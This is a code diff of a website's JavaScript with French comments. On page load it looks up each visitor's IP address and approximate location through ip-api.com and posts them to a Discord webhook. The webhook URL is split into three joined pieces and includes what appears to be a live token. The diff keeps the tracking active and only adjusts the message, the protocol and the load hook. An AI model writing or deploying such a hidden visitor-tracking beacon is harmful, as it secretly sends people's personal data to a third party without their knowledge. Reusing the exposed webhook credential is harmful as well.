@@ -6,8 +6,10 @@ function sendToDiscord(ip, location) {
     const part2 = "1255583928014733323/";
     const part3 = "tC8_UZYiqZVSvPObYHkG6Wsx_jfI-2COijzDJPYwB3cmO4lI-i3oKRoXIhWXw8jnCjQu";
     const webhookUrl = part1 + part2 + part3;
-        const message = {
-        content: `Someone visited the site ( bruh ).\n IP: ${ip}\nLocalization : ${location}`
+    
+    const message = {
+        content: `Someone visited.\n IP: ${ip}\nLocalization : ${location}`
+    };
 
     fetch(webhookUrl, {
         method: 'POST',
@@ -28,7 +30,7 @@ function sendToDiscord(ip, location) {
 
 // Fonction pour obtenir l'adresse IP et la localisation approximative de l'utilisateur
 function getUserIPAndLocation() {
-    fetch('http://ip-api.com/json')
+    fetch('https://ip-api.com/json')
         .then(response => response.json())
         .then(data => {
             const ip = data.query;
@@ -41,6 +43,6 @@ function getUserIPAndLocation() {
 }
 
 // Exécuter la fonction getUserIPAndLocation lorsque le document est complètement chargé
-document.addEventListener("DOMContentLoaded", function() {
+window.onload = function() {
     getUserIPAndLocation();
-});
+};
